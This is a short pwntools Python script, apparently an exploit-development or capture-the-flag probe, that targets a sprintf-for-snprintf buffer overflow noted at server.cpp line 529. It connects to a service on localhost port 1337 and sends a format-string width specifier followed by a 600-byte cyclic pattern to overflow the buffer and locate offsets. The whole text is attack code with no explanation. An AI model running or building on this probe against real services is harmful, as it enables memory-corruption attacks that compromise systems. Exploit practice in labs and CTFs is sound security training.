# sprintf instead of snprintf on
# server.cpp:529
from pwn import *
context(arch = 'amd64', os = 'linux')

r = remote('localhost', 1337)

r.recv(4096)
r.sendline("%700X " + cyclic(600))
print(r.recv(4096))